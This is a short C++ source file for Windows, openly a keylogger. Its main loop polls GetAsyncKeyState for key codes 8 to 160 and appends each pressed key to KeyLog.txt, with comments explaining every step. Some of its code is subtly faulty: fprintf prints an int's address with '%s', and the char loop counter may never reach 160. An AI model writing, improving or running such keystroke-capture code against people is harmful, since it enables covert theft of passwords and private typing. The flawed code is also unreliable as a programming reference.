
//Including header files
#define _CRT_SECURE_NO_DEPRECATE
#include<iostream>
#include<Windows.h>
#include<WinUser.h>
#include<fstream>
using namespace std;



// The Log() function writes the key stroke into a output file

int Log(int key)						//'key' has the ASCII equivalent of the key pressed
{
	FILE *output;
	output = fopen("KeyLog.txt", "a+");		//Output is kept in KeyLog.txt
	fprintf(output, "%s", &key);			//The char equivalent of 'key' is sent
	fclose(output);
	return 0;
}

//The main function to monitor the key strokes pressed and send them to the Log() function

int main()
{
	char stroke;
	while (true)		//goes to an infinite loop so that it can always monitor the key strokes
	{
		for (stroke = 8; stroke <= 160; stroke++)
		{
			if (GetAsyncKeyState(stroke) == -32767)   // when a key is pressed the inbuilt windows function returns -32767 for the particular key stroke
			{
				Log(stroke);	//send the keystroke to be logged
			}
		}
	}
	return 0;
}